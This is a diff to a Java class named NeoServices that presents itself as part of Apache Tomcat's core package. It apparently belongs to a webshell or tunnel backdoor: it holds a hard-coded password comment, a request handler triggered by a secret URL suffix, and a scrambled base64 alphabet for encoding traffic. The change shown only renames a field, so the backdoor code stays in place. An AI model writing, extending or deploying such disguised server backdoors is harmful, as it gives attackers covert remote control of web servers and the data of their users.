@@ -4,7 +4,7 @@ public class NeoServices {
     //密码：donttouch
 
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
-    public static String SERVER_URL="agenstN";
+    public static String SERVICE_URL="agenstN";
 
     public static byte[] unGzip(byte[] bytes) throws Exception{
         java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
@@ -27,7 +27,7 @@ public class NeoServices {
 
     public static void doServices(java.util.Map rdd,Object obj) throws Exception {
         //为什么没有这么多抛出？因为它善
-        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.NeoServices.SERVER_URL)) {
+        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.NeoServices.SERVICE_URL)) {
             String charslist = "kXEQ0idLPc4B/sHvgWM5Y7ZfSmGlJI6N+bD28a3joRn9qtxwpyOhzVCuKAe1UFTr";
             Object[] args = new Object[]{
                     ((java.util.Map)obj).get("request"), //0
